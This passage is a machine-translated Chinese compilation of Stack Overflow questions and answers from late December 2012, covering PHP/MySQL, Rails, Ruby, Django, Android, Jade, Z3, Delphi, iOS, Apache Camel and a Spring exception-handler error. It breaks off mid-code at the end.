> ID：14097733
> 
> 赞同：1
> 
> 时间：2012-12-31T05:18:40.753
> 
> 标签：php, mysql, database, arrays

我有一个 MySQL 数据库设置，如下所示：

```
id | username
-------------
1  | name1
2  | name2
3  | name3 
```

但是当我在 PHP 中使用这段代码时，它只读取名字。注意：我需要它来读取名称。id 用于其他用途。

```
$sql = mysql_query("SELECT `username` FROM `black_list`");      
$blacklist = array();         
while($row = mysql_fetch_array($sql))
{
    $blacklist[] = $row;
    if(!in_array($name,$blacklist))
    {
          //User not protected
    } else {
          echo "User Protected";
    }
 } 
```

如果有人可以帮助我，那就太好了。谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:20:57.367

用这个

```
while($row = mysql_fetch_array($sql))
{
    $blacklist[] = $row['username'];
}

if(!in_array($name,$blacklist))
{
      echo "Coming Soon";
} else {
      echo "User Protected";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:23:46.497

你可以这样做：

```
if (!in_array($name, mysql_fetch_array($sql))) {
    echo "Coming Soon";
} else {
    echo "User Protected";
} 
```

但是您实际上应该在数据库级别执行此操作。这利用了数据库优化，不需要将*整个表*加载到内存中。

```
$query = mysql_query(sprintf(
    'SELECT 1 FROM `skype_bl` WHERE `username`="%s"',
    mysql_real_escape_string($name)
));

if (mysql_num_rows($query)) {
    // Username not available
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:54:14.763

我想你想比较是否`$name`在黑名单数组中。为此，您必须首先构建您的黑名单数组，然后进行比较`$name`。在您的代码中，它只是将名称与数组的当前内容进行比较，`$blacklist`而不是整个数组。

如果您正在迭代第一行，它会将结果集第一行的值添加到`$blacklist`并`$name`仅与该元素进行比较。当它进入第二行时，它将结果集中第二行的值添加到数组中，因此这次它将与`$name`数组中的两个元素（结果集中的前两行）进行比较。它还将检查结果`$name`集中`$blacklist`的每次迭代。我不认为你想要这个。所以我们首先建立一个黑名单数组，然后只比较一次。

```
//building the $blacklist array
while($row = mysql_fetch_array($sql)){
    $blacklist[] = $row['username'];
}

//Comparing $name with all elements of $blacklist which is now a full list
if(!in_array($name,$blacklist)){
      echo "Coming Soon";
}else{
      echo "User Protected";
} 
```

# ruby-on-rails-3 - 自闭标签不能有内容？

> ID：14097734
> 
> 赞同：0
> 
> 时间：2012-12-31T05:19:11.307
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.2, haml, mailer

我正在尝试为我的电子邮件使用邮件布局，我已放入`notifications_mailer.html.erb`布局文件夹，并且我有一个电子邮件视图`migration_message.html.haml`

但是为什么我会有这个内部服务器错误 500：

> 自闭标签不能有内容

在`notifications_mailer.html.erb`我有：

```
<div class="article-content" align="left" style="font-size: 13px;line-height: 18px;color: #444;margin-top: 0;margin-bottom: 18px;font-family: 'Helvetica Neue', Arial, Helvetica, Geneva, sans-serif">
   <%= yield %>
</div> 
```

这不是在邮件布局中添加产量的方法吗？

应该在哪里调试这个错误？在真实服务器上测试电子邮件之前，是否有一个 gem 可以在浏览器上测试电子邮件？

编辑

代码`migration_message.html.haml`

```
=content_for :title do
  Hello fan!
%p
  %span{:id => "internal-source-marker_0.12735640932997944"} We are happy to inform you about our new website, in which you can find new features. You have registered with us in our previous website, therefore we are very glad to inform you about our new one.
%p
  %span Take a look at the #{link_to 'Virtual Circuit Lab', lab_path} & check the Lab #{link_to 'Features', features_path}
  If you’ve already checked out the site, Follow our #{link_to 'Facebook page', "https://www.facebook.com/ourwebsite"} and invite a friend to do the same!
  %br/ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T11:38:41.627

至于问题的第二部分，有一个名为[Letter Opener](https://github.com/ryanb/letter_opener)的宝石可以完全满足您的要求。当您调用`deliver`消息时，它将打开带有消息的浏览器而不是发送消息。

# ruby - 哈希表示法的新风格

> ID：14097736
> 
> 赞同：0
> 
> 时间：2012-12-31T05:19:27.290
> 
> 标签：ruby

这个有效

```
items = Item.where(:item_id.in => items.map(&:id)) 
```

不像这两个

```
items = Item.where(item_id:.in items.map(&:id))
items = Item.where(item_id.in: items.map(&:id)) 
```

有没有办法将“旧式 Ruby 哈希”的第一个表达式转换为“新式 Ruby 哈希”表示法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:32:16.057

不，没有。仅当`{key: value}`密钥可以写为符号文字时，才可以使用哈希表示法。

# python - 如何在 django 通用视图中覆盖父类中的方法

> ID：14097746
> 
> 赞同：0
> 
> 时间：2012-12-31T05:20:56.927
> 
> 标签：python, django

我正在使用基于类的通用视图。

```
class MyView(UpdateView):
    model = MyModel
    success_url = "/test/list" 
```

现在这工作正常。

但我想创建父类，以便我的所有视图都继承自它并`success_url`像这样定义

```
class MyMixin(object):
    def __init__(self, *args, **kwargs):
        self.success_url ="/test/list?myvar=true" 
```

然后

```
class MyView(UpdateView, MyMixin):
    model = MyModel
    success_url = "/test/list" 
```

但我`success_url`的没有被覆盖

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T05:29:16.280

我会这样做。

```
class MyMixinView(object):

    def get_success_url(self):
        return "/test/list"

class ChildUpdateView(UpdateView, MyMixinView):
    model = MyModel 
```

HTH..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T08:05:29.363

就像@phoenix 建议的那样，在您的 myView 类中，创建 MyMixin 的实例，如下所示

```
class myview(updateview,MyMixin):
    myVar=MyMixin("a") #just an e.g
    print myVar.success_url 
```

输出：/test/list?myvar=true

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-02T03:02:10.570

你必须把它放在`myMixin`前面，`Updateview`因为 Updateview 已经有 get_success_url。

这应该工作

```
class MyMixin(object):
    def get_success_url(self):
        return "/test/list"

class MyView(MyMixin, UpdateView):
    model = MyModel 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T06:00:55.287

那是因为您不是在修改实例变量，而是在修改同名的局部变量。

# android - OnClickListener 中的类变量

> ID：14097747
> 
> 赞同：0
> 
> 时间：2012-12-31T05:20:59.113
> 
> 标签：android, onclick, sharedpreferences, onclicklistener, class-variables

我的 OnClickListeners 有一个单独的类。我想在单击按钮时将项目添加到数组列表，并在第二次单击时将其删除。我在这里有框架：

```
public void onClick(View v) {
        Button button = (Button)v;
        if(isClicked) {
            button.setText("Enabled");
            Log.v("Spirit: ", v.getTag() + "");
            spirits_list.add(v.getTag() + "");
            isClicked = false;
        } else {
            button.setText("Disabled");
            spirits_list.remove(v.getId()-1);
            isClicked = true;
        }

    } 
```

我还在顶部初始化了一个 ArrayList，但每次我单击一个按钮时，它都会重新初始化 ArrayList。我怎样才能解决这个问题？此外，我需要能够将 ArrayList 保存到 SharedPreferences - 如何从我的 OnClickListener 中执行此操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:29:26.677

由于您使用自己的班级，因此您可以在班级成员中传递所有优点：

```
class MyListener implements View.OnClickListener {

    private ArrayList<Object> spirits_list;
    private Context ctx;

    public MyListener( Context ctx, ArrayList<Object> list ) {
        super();
        this.ctx = ctx;
        this.spirits_list = list;
    }

    public void onClick(View v) {
        Button button = (Button)v;
        if(isClicked) {
            button.setText("Enabled");
            Log.v("Spirit: ", v.getTag() + "");
            this.spirits_list.add(v.getTag() + "");
            isClicked = false;
        } else {
            button.setText("Disabled");
            this.spirits_list.remove(v.getId()-1);
            isClicked = true;
        }

    }

} 
```

上下文也将允许您访问 SharedPrefs。然后，您可以按如下方式调用此位：

```
view.setOnClickListener( new MyListener( this, spirits_list ) ); 
```

# android - Imagebutton 使用双重嵌套的 layout_weights 渲染不正确

> ID：14097750
> 
> 赞同：0
> 
> 时间：2012-12-31T05:21:08.537
> 
> 标签：android, android-layout, android-xml

使用这些图像：

![在此处输入图像描述](../Images/adf775dc280d32929a60bb54b441fcb9.png) **(333x300) ** ![在此处输入图像描述](../Images/2c9c7f6f8d270c0d00bfb0785361181d.png) **(1680x1050)**

这个布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_margin="12dp"
    android:orientation="vertical">

    <LinearLayout 
        android:orientation="horizontal"
        android:layout_width="match_parent" 
        android:layout_height="0dp"
        android:layout_weight="1"
        android:gravity="center">    

        <ImageButton
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:scaleType="fitCenter"
            android:src="@drawable/apple" />

        <ImageButton
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:scaleType="fitCenter"
            android:src="@drawable/apple" />
    </LinearLayout>

    <LinearLayout 
        android:orientation="horizontal"
        android:layout_width="match_parent" 
        android:layout_height="0dp"
        android:layout_weight="1"
        android:gravity="center">   

        <ImageButton
            style="@style/OtherButton"
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:scaleType="fitCenter"
            android:src="@drawable/orange" />

        <ImageButton
            style="@style/OtherButton"
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:scaleType="fitCenter"
            android:src="@drawable/orange" />

    </LinearLayout>
</LinearLayout> 
```

给出这个结果：

![在此处输入图像描述](../Images/cbd3f12645fc28e1a4e5fac6e4fe3271.png)

只有单嵌套布局，苹果和橙色按钮的大小相同。在使用 Eclipse 之后，我注意到按钮在图像较大时往往会更高，但相对比例似乎并没有遵循特定的模式。

**为什么按钮有不同的高度？我可以使用另一种方法来缩放屏幕分辨率和密度吗？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:43:06.430

进行以下更改。

在您的主要父布局中，将 layout_height 设置为`android:layout_height="fill_parent"`

# node.js - 在视图中获取编译好的玉模板？

> ID：14097752
> 
> 赞同：1
> 
> 时间：2012-12-31T05:21:24.573
> 
> 标签：node.js, express, pug

我有一个“部分”模板，我想同时使用客户端和服务器端。

是否有一些方法或过滤器或与它非常相似的东西，`include`除了它不是立即执行模板，而是返回一个客户端编译的函数，然后我可以将它分配给一个 JS 变量并在整个脚本中使用？

目前，我正在这样做：

```
exports.list = function(req, res){
    res.render('file/list', {
        ...
        fileItemTemplate: jade.compile(fs.readFileSync(path.join(req.app.get('views'),'file','file-item.jade')), {client: true})
    });
}; 
```

然后在我的模板中我有：

```
ul#folder-list.thumbnails
    each file in files
        include file-item

...

script(type='text/javascript')
    var fileItemTemplate = !{fileItemTemplate}; 
```

通过这种方式，我可以在页面加载时将一些项目呈现为 HTML，然后通过在数据进入时呈现部分内容来添加更多内容。

这可行，但感觉不是很干燥，因为我必须读取文件，处理路径中的文件路径和内容，然后基本上重新声明完全相同的变量客户端。

有这样做的好方法吗？

像这样的东西是理想的：

```
script(type='text/javascript')
    var fileItemTemplate = !{compile file-item}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T20:06:23.510

一个可能的解决方案可能是[JadeAsset](https://github.com/techpines/asset-rack#jadeasset)。[另请参阅此处](https://stackoverflow.com/questions/9522542/how-to-compile-jade-templates-in-to-javascript-functions-to-use-them-on-client-s)的讨论。

您可以将资产挂钩到 Express：

```
assets.on('complete', function() {
    var app = express.createServer();
    app.configure(function() {
        app.use(assets);  // that's all you need to do
    });
    app.listen(8000);
}); 
```

要创建您的 Jade 资产：

```
var assets = new AssetRack([
    new rack.JadeAsset({
        url: '/templates.js',
        dirname: __dirname + '/templates'
    })
]); 
```

# arrays - Z3 是否支持对对象数组进行编码？

> ID：14097754
> 
> 赞同：3
> 
> 时间：2012-12-31T05:21:33.823
> 
> 标签：arrays, object, z3

我想知道 Z3 是否支持对任意复杂对象的数组进行编码，例如列表或其他东西。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:53:22.853

Z3 支持递归数据类型。我们可以使用它们来定义列表、树等。请参阅[Z3 教程](http://rise4fun.com/Z3/tutorial/guide)中的数据类型部分。我们还可以使用任意索引和值类型定义数组。所以，我们可以有数组数组、列表数组等。这是一个例子。也可[在此处](http://rise4fun.com/Z3/39LT)在线获取。

```
(declare-const l (List Int))
(declare-const a (Array Int (List Int)))

(assert (= (select a 0) l))
(assert (not (= l nil)))
(check-sat) 
```

# delphi - TPersistent：通知

> ID：14097758
> 
> 赞同：0
> 
> 时间：2012-12-31T05:22:01.783
> 
> 标签：delphi, components, delphi-xe3

我有一个 TPersistent 定义如下：

```
 TGlyph = class(TPersistent)
  private
    FOwner: TControl;
    FLayout: TGlyphAlignment;
    FVisible: Boolean;
    FImageIndex: Integer;
    FImages: TImageList;
    ..............
  protected
    procedure Invalidate;
  public
    constructor Create(AOwner: TControl);
    destructor Destroy; override;
    .............
  published
    property ImageIndex: Integer read FImageIndex write SetImageIndex default -1;
    property Images: TImageList read FImages write SetImages;
    .............
  end; 
```

是否必须有一个将 nil 值分配给 FImages 字段的通知程序，例如您用于 TComponent 的那种？

```
procedure TGlyph.Notification(AComponent: TComponent; Operation: TOperation);
begin
  inherited;
  if (Operation = opRemove) and (AComponent = FImages) then
  begin
    FImages.OnChange := nil;
    FImages := nil;
    Invalidate;
  end;
end; 
```

如果可以，这个程序应该怎么写？

谢谢你，恩佐

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:40:56.307

这取决于你的类是如何使用的。该`Notification`方法不会自动调用，只能由您自己的代码（或您的类用户编写的代码）调用。因此，如果`Notification`从不调用，则不需要它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T07:55:07.533

`TPersistent`不支持`Notification()`系统。你需要`TComponent`那个。如果在您也编写`TGlyph`的 a 中使用，那么您可以让它处理通知并在需要时进行更新。否则，您将不得不更改为从 派生，在这种情况下，如果在 a 中使用，则只需确保调用自身以避免任何 Object Inspector 和 DFM 流问题。`TComponent``TComponent``TGlyph``TGlyph``TComponent``TGlyph``TComponent``TGlyph``SetSubComponent(True)`

# ios - 如何从 iOS 中的文档目录中读取文件

> ID：14097759
> 
> 赞同：0
> 
> 时间：2012-12-31T05:22:01.460
> 
> 标签：ios

我需要在 iOS 的文档目录中搜索一个文件，但我不知道该文件的扩展名。如何搜索没有扩展名的文件。如果您知道 filename.extension(abc.txt)，下面是代码。如何使用 jsut 文件名（abc）搜索相同的文件

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, 
NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *filePath = [documentsDirectory stringByAppendingPathComponent:@"abc.txt"];
NSString *content = [NSString stringWithContentsOfFile:filePath     
encoding:NSUTF8StringEncoding error:NULL]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T06:39:29.117

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, 
NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSArray *directoryContent = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:documentsDirectory error:nil];
NSString *fileWithExt = nil;
for (NSString *file in directoryContent )
{
    if([file stringByDeletingPathExtension] isEqualsTo:@"abc"]
    {
       fileWithExt = file;
       break;
    }
} 
```

**PS：**将`fileWithExt`包含第一个文件名`abc`

# objective-c - Objective-c 在屏幕上调用触摸而不用户触摸屏幕

> ID：14097760
> 
> 赞同：1
> 
> 时间：2012-12-31T05:22:11.787
> 
> 标签：objective-c, uiview, touch

我将使用一个允许 iphone 应用程序控制我在 iPad 上的应用程序的框架。当我添加它时，我要让操纵杆移动鼠标的图像，并且当用户按下 A 按钮时，我想让设备认为用户当时正在触摸。有没有办法做到这一点？

示例：我在 ipad 屏幕上的 0,0 处放置一个按钮，高度和宽度为 100。然后鼠标位于点 50,50，当用户按住 A 时，该按钮被按住，当用户抬起时，它称之为按钮动作。

# iphone - 可达性 API 未感知 WiFi 开关

> ID：14097761
> 
> 赞同：1
> 
> 时间：2012-12-31T05:22:15.693
> 
> 标签：iphone, objective-c, wifi, reachability

我在我的项目中使用可达性示例来测试网络连接。我正在使用 ReachabilityForInternetConnection。回调在 WiFi 切换期间大部分时间都会被调用，但有时在 WiFi 切换很少的情况下不会被调用。所以我也开始通知 WIFI 可达性。但有时仍不会为 WiFi 开关调用回调。我应该怎么做才能一直调用 WiFi 开关事件？有人指出我要实现一个计时器来感知事件，但我认为苹果是否有回调机制；轮询是一种有效的选择，也不应该成为应用拒绝的原因。如果我遗漏了什么，请告诉我。提前致谢。

# ios - 将图像发布到 Facebook 页面，iOS

> ID：14097763
> 
> 赞同：0
> 
> 时间：2012-12-31T05:22:19.427
> 
> 标签：ios, facebook, api

在我的应用程序中，我希望能够发布到用户的个人资料和他们的任何页面。发布到他们的个人资料相对简单且有据可查，但是，我在示例代码领域几乎没有发现将图像发布到页面。我已经阅读[了这个页面](https://developers.facebook.com/docs/reference/api/page/)，但是，它没有提供任何关于如何完全按照它所说的去做的例子。谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:14:57.513

使用 Facebook Graph API 试试这个方法

//facebook在墙上贴一张图片

```
 NSMutableDictionary *params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                       userImgView.image, @"picture",
                                       nil];

[facebook requestWithGraphPath:@"me/photos"
                     andParams:params
                 andHttpMethod:@"POST"
                   andDelegate:self]; 
```

# ruby - Ruby 要求：没有这样的文件或目录

> ID：14097768
> 
> 赞同：0
> 
> 时间：2012-12-31T05:22:59.257
> 
> 标签：ruby, gem, require

我为 Ruby 安装了 openbabel gem，并收到“安装成功”的消息。但是，当我尝试要求它时，例如在 IRB 中，我收到以下消息：

```
LoadError: No such file or directory - /usr/lib/ruby/gems/1.9.1/gems/openbabel-
2.3.1.8/lib/openbabel/openbabel.so 
```

当我`ls -l`复制并粘贴这个确切的路径时，我得到的是：

```
-rwxr-xr-x 1 sselcuk None 11M Dec 30 23:44 openbabel.so* 
```

我还检查了这个：

```
which ruby => /usr/bin/ruby
gem env|grep 'RUBY EXECUTABLE' => /usr/bin/ruby 
```

这种行为的原因是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:24:28.620

根据您使用的设置，您[首先需要 ruby​​gems](http://docs.rubygems.org/read/chapter/4)。

例子：

```
require 'rubygems'
require 'an_other_gem' 
```

# apache-camel - 将 XML 信息转换为 Java - Apache Camel

> ID：14097771
> 
> 赞同：0
> 
> 时间：2012-12-31T05:23:14.760
> 
> 标签：apache-camel

这是与 apache camel 二进制文件捆绑在一起的示例

```
 <route>
      <!-- incoming requests from the servlet is routed -->
      <from uri="servlet:///hello"/>
      <choice>
        <when>
          <!-- is there a header with the key name? -->
          <header>name</header>
          <!-- yes so return back a message to the user -->
          <transform>
            <simple>Hello ${header.name} how are you?</simple>
          </transform>
        </when>
        <otherwise>
          <!-- if no name parameter then output a syntax to the user -->
          <transform>
            <constant>Add a name parameter to uri, eg ?name=foo</constant>
          </transform>
        </otherwise>
      </choice>
    </route> 
```

如何将其翻译成 Java

我是骆驼的初学者，有些是怎么做到的

```
CamelContext context = new DefaultCamelContext();

context.addRoutes(new RouteBuilder(){

 public void configure(){

 from("servlet://hello").transform().....
}
}); 
```

但不知道如何进一步进行......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T09:17:04.017

如果您想在没有任何 XML（即 spring）的情况下将其移植到 java，则不能（轻松）使用 servlet 组件。

只是移植路线就像：

```
from("servlet:///hello")
      .choice()
        .when()
           .header("name")
              .transform(simple("Hello ${header.name} how are you?"))
        .otherwise()
            .transform(constant("Add a name parameter to uri, eg ?name=foo")); 
```

它应该在 spring 示例（或任何 spring web 应用程序）中工作，只需将 替换为您`<route>`已将路由定义为 spring bean ( )。`<CamelContext>``<routeBuilder ref="demoRoute">``<bean id="demoRoute" class="org.example.demo.DemoRoute">`

但是，我猜你想用普通的java（没有spring，没有xml，没有webapp）来做这件事。您可以使用 Jetty 组件。不同之处在于 Camel 然后将启动 servlet 容器，而不是 servlet 容器启动 Camel。不过，这个简单的例子没有区别。

我建议您从 Maven 原型开始构建骨架

例如，`mvn archetype:generate`然后选择`org.apache.camel.archetypes:camel-archetype-java (Creates a new Camel project using Java DSL.)` 好吧，如果您有自己的 java 应用程序并让线程继续运行，则不需要 maven 原型。那么你应该用你的方法做得很好。然而，maven 原型非常适合训练目的。

然后，您需要向 Jetty (camel-jetty.jar) 添加依赖项（[在此处](http://camel.apache.org/jetty)阅读更多内容）。

除了第一行之外，实际路线将完全相同：`from("jetty:http://localhost:8080/camel/hello")`

好，易于。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T08:30:25.127

试试这个：

```
from("servlet://hello")
.choice()
.when(header("name").isNotNull()).transform(simple("Hello ${header.name} how are you?"))
.otherwise().transform(constant("Add a name parameter to uri, eg ?name=foo")); 
```

# java - 模棱两可的 @ExceptionHandler 方法映射

> ID：14097772
> 
> 赞同：5
> 
> 时间：2012-12-31T05:23:26.200
> 
> 标签：java, spring-mvc, exception-handling

我面临一个奇怪的问题以下是我`UserController`班上的两种方法

```
 @RequestMapping(value = "/list", method = RequestMethod.GET)
    @ExceptionHandler(GenericException.class)
    public ModelAndView list(@ModelAttribute(Constants.KEY_USER_RIGHTS) Map<String, Rights> rights,@ModelAttribute(Constants.KEY_LOGGED_IN_USER) User user, HttpServletRequest request) {//details omitted}
 @RequestMapping(value = "/invite", method = RequestMethod.POST)
    @ExceptionHandler(GenericException.class)
    public ModelAndView create(@ModelAttribute(value = "preRegister") PreRegister preRegister,Model model,HttpServletRequest request){//details omitted} 
```

当请求来到这个控制器时，它抛出一个异常的堆栈跟踪如下：

```
java.lang.IllegalStateException: Ambiguous @ExceptionHandler method mapped for [class com.hcdc.coedp.safe.exception.GenericException]: {public org.springframework.web.servlet.ModelAndView com.hcdc.coedp.safe.controller.UserController.list(java.util.Map,com.hcdc.coedp.safe.domain.User,javax.servlet.http.HttpServletRequest), public org.springframework.web.servlet.ModelAndView com.hcdc.coedp.safe.controller.UserController.create(com.hcdc.coedp.safe.domain.PreRegister,org.springframework.ui.Model,javax.servlet.http.HttpServletRequest)}.
    at org.springframework.web.method.annotation.ExceptionHandlerMethodResolver.addExceptionMapping(ExceptionHandlerMethodResolver.java:93)
    at org.springframework.web.method.annotation.ExceptionHandlerMethodResolver.<init>(ExceptionHandlerMethodResolver.java:61)
    at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.getExceptionHandlerMethod(ExceptionHandlerExceptionResolver.java:356)
    at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:306)
    at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:60)
    at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:136)
    at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1148)
    at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:985)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:939)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:856)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:915)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:811)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:668)
    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:796)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:770)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1542)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:343)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:368)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:109)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:97)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:100)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:78)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:35)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:177)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:187)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:79)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:169)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217)
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217)
    at org.springframework.orm.hibernate3.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:233)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:279)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:849)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:746)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1045)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:228)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722) 
```

以下是我的`GenericException`课：

```
public class GenericException extends RuntimeException {

    private String exceptionMsg;

    public GenericException(String exceptionMsg) {
        this.exceptionMsg = exceptionMsg;
    }

    public String getExceptionMsg() {
        return exceptionMsg;
    }

